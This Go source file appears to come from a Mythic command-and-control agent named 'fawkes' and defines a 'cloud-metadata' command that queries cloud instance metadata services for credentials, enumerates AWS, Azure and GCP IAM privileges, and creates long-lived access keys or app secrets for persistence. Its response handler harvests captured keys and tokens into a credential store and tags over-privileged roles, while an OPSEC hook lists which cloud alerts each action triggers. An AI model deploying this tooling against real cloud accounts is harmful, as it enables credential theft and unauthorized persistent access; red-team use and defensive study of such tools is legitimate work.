package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "cloud-metadata",
		Description:         "Probe cloud instance metadata services (AWS/Azure/GCP/DigitalOcean) for credentials, identity, and configuration. Supports IMDSv2 for AWS.",
		HelpString:          "cloud-metadata -action detect\ncloud-metadata -action creds\ncloud-metadata -action all -provider aws\ncloud-metadata -action aws-iam\ncloud-metadata -action azure-graph\ncloud-metadata -action gcp-iam",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1552.005", "T1580", "T1526", "T1098.001"},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "cloud_metadata_new.js"),
			Author:     "@galoryber",
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "action",
				CLIName:       "action",
				Description:   "Action: detect, all, creds, identity, userdata, network, aws-iam, azure-graph, gcp-iam, aws-persist, azure-persist",
				DefaultValue:  "detect",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"detect", "all", "creds", "identity", "userdata", "network", "aws-iam", "azure-graph", "gcp-iam", "aws-persist", "azure-persist"},
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "provider",
				CLIName:       "provider",
				Description:   "Cloud provider to query (auto-detects if not specified)",
				DefaultValue:  "auto",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"auto", "aws", "azure", "gcp", "digitalocean"},
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:          "timeout",
				CLIName:       "timeout",
				Description:   "Per-request timeout in seconds (default: 3)",
				DefaultValue:  3,
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			hostname := processResponse.TaskData.Callback.Host
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData

			// Extract AWS access keys if present
			if strings.Contains(responseText, "AccessKeyId") {
				lines := strings.Split(responseText, "\n")
				var accessKey, secretKey, roleName string
				for _, line := range lines {
					line = strings.TrimSpace(line)
					if strings.HasPrefix(line, "AccessKeyId:") {
						accessKey = strings.TrimSpace(strings.TrimPrefix(line, "AccessKeyId:"))
					} else if strings.HasPrefix(line, "SecretAccessKey:") {
						secretKey = strings.TrimSpace(strings.TrimPrefix(line, "SecretAccessKey:"))
					} else if strings.HasPrefix(line, "[+] AWS IAM Role:") {
						roleName = strings.TrimSpace(strings.TrimPrefix(line, "[+] AWS IAM Role:"))
					}
				}
				if accessKey != "" && secretKey != "" {
					account := "AWS IAM"
					if roleName != "" {
						account = fmt.Sprintf("AWS IAM (%s)", roleName)
					}
					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
						CredentialType: "key",
						Realm:          hostname,
						Account:        account,
						Credential:     fmt.Sprintf("AccessKeyId=%s SecretAccessKey=%s", accessKey, secretKey),
						Comment:        "cloud-metadata (AWS IAM)",
					})
				}
			}

			// Extract Azure/GCP tokens if present
			if strings.Contains(responseText, "access_token") {
				lines := strings.Split(responseText, "\n")
				for _, line := range lines {
					line = strings.TrimSpace(line)
					if strings.HasPrefix(line, "access_token:") || strings.HasPrefix(line, "Token:") {
						token := strings.TrimSpace(strings.SplitN(line, ":", 2)[1])
						if len(token) > 10 {
							provider := "Cloud"
							if strings.Contains(responseText, "Azure") {
								provider = "Azure"
							} else if strings.Contains(responseText, "GCP") || strings.Contains(responseText, "google") {
								provider = "GCP"
							}
							creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
								CredentialType: "token",
								Realm:          hostname,
								Account:        fmt.Sprintf("%s Managed Identity", provider),
								Credential:     token,
								Comment:        fmt.Sprintf("cloud-metadata (%s token)", provider),
							})
							break // Only capture first token
						}
					}
				}
			}

			// Extract persist-created credentials (AccessKey + SecretKey from aws-persist output)
			if strings.Contains(responseText, "SUCCESS: Created") {
				lines := strings.Split(responseText, "\n")
				var accessKey, secretKey, account string
				for _, line := range lines {
					line = strings.TrimSpace(line)
					if strings.HasPrefix(line, "AccessKey:") {
						accessKey = strings.TrimSpace(strings.TrimPrefix(line, "AccessKey:"))
					} else if strings.HasPrefix(line, "SecretKey:") {
						secretKey = strings.TrimSpace(strings.TrimPrefix(line, "SecretKey:"))
					} else if strings.HasPrefix(line, "Account:") {
						account = strings.TrimSpace(strings.TrimPrefix(line, "Account:"))
					} else if strings.HasPrefix(line, "App ID:") && !strings.Contains(line, "Object") {
						// Azure app ID
						accessKey = strings.TrimSpace(strings.TrimPrefix(line, "App ID:"))
					} else if strings.HasPrefix(line, "Secret:") {
						secretKey = strings.TrimSpace(strings.TrimPrefix(line, "Secret:"))
					}
				}
				if accessKey != "" && secretKey != "" {
					provider := "AWS"
					if strings.Contains(responseText, "Azure") {
						provider = "Azure"
					}
					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
						CredentialType: "key",
						Realm:          hostname,
						Account:        fmt.Sprintf("%s Persist (%s)", provider, account),
						Credential:     fmt.Sprintf("ID=%s Secret=%s", accessKey, secretKey),
						Comment:        fmt.Sprintf("cloud-metadata %s-persist (long-lived)", strings.ToLower(provider)),
					})
				}
			}

			registerCredentials(processResponse.TaskData.Task.ID, creds)

			// Tag IAM enumeration actions
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			switch action {
			case "aws-iam":
				if strings.Contains(responseText, "AdministratorAccess") || strings.Contains(responseText, "PowerUser") {
					tagTask(processResponse.TaskData.Task.ID, "PRIVESC",
						"AWS IAM: overprivileged role detected (T1580)")
				}
				createArtifact(processResponse.TaskData.Task.ID, "Cloud Discovery",
					"AWS IAM privilege enumeration (STS+IAM)")
			case "azure-graph":
				if strings.Contains(responseText, "Global Administrator") || strings.Contains(responseText, "globalAdmin") {
					tagTask(processResponse.TaskData.Task.ID, "PRIVESC",
						"Azure AD: Global Administrator detected (T1580)")
				}
				createArtifact(processResponse.TaskData.Task.ID, "Cloud Discovery",
					"Azure AD Graph enumeration (users, groups, apps)")
			case "gcp-iam":
				if strings.Contains(responseText, "roles/owner") || strings.Contains(responseText, "roles/editor") {
					tagTask(processResponse.TaskData.Task.ID, "PRIVESC",
						"GCP IAM: Owner/Editor role detected (T1580)")
				}
				createArtifact(processResponse.TaskData.Task.ID, "Cloud Discovery",
					"GCP IAM policy enumeration (T1526)")
			case "aws-persist", "azure-persist":
				tagTask(processResponse.TaskData.Task.ID, "PERSIST",
					fmt.Sprintf("Cloud persistence: %s (T1098.001)", action))
			}

			return response
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			msg := "OPSEC WARNING: Querying cloud metadata service at 169.254.169.254 (T1552.005). HTTP requests to metadata endpoints are a well-known credential theft technique. Cloud security monitoring (GuardDuty, Defender for Cloud) specifically watches for metadata service access from unusual processes."
			switch action {
			case "aws-iam":
				msg += " Additionally, AWS IAM API calls (STS, IAM) are logged in CloudTrail and may trigger GuardDuty alerts for unusual API usage patterns."
			case "azure-graph":
				msg += " Additionally, Microsoft Graph API calls are logged in Azure AD audit logs and may trigger Defender for Cloud alerts for suspicious managed identity usage."
			case "gcp-iam":
				msg += " Additionally, GCP IAM and Cloud Resource Manager API calls are logged in Cloud Audit Logs and may trigger Security Command Center alerts."
			case "aws-persist":
				msg += " HIGH RISK: Creating IAM access keys generates CloudTrail events (CreateAccessKey). This is a high-fidelity indicator of credential persistence (T1098.001). GuardDuty and CSPM tools actively alert on unusual CreateAccessKey calls."
			case "azure-persist":
				msg += " HIGH RISK: Creating Azure AD app registrations and client secrets generates audit events (Add application, Update application). This is a persistence indicator (T1098.001). Defender for Cloud may alert on managed identity creating app registrations."
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked: false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			provider, _ := taskData.Args.GetStringArg("provider")
			display := action
			if provider != "" && provider != "auto" {
				display += fmt.Sprintf(" (%s)", provider)
			}
			response.DisplayParams = &display
			return response
		},
	})
}
